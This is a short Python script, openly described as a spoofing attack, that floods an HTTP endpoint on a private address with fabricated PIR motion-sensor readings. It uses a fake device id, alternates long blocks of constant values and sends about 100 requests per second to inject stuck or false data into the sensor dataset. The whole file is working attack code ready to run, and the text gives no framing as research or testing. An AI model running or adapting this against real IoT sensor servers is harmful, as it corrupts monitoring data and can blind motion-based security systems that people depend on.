import requests
import threading
import time
import random

server_url = 'http://10.34.221.112:5001/pir'  # Change to your PIR sensor server endpoint

stop_flag = False

def spoofing_pattern():
    # Alternates blocks of "0"s and "1"s to create stuck/fake readings in the dataset
    global stop_flag
    while not stop_flag:
        block_value = random.choice(["0", "1"])
        block_size = random.randint(50, 300)
        for _ in range(block_size):
            if stop_flag:
                break
            spoofed_data = {
                "device_id": "pir_motion_detector_fake",
                "motion_detected": block_value
            }
            try:
                response = requests.post(server_url, json=spoofed_data, timeout=2)
                print(response.status_code, response.text, spoofed_data)
            except Exception as e:
                print("Error:", e)
            time.sleep(0.01)  # ~100 requests/sec

def main():
    global stop_flag
    spoofing_thread = threading.Thread(target=spoofing_pattern)
    spoofing_thread.start()
    print("Spoofing attack running. Press Ctrl+C to stop.")
    try:
        while spoofing_thread.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_flag = True
        print("\nScript interrupted by user. Stopping spoofing attack...")
        spoofing_thread.join()
        print("Spoofing attack stopped.")

if __name__ == "__main__":
    main()
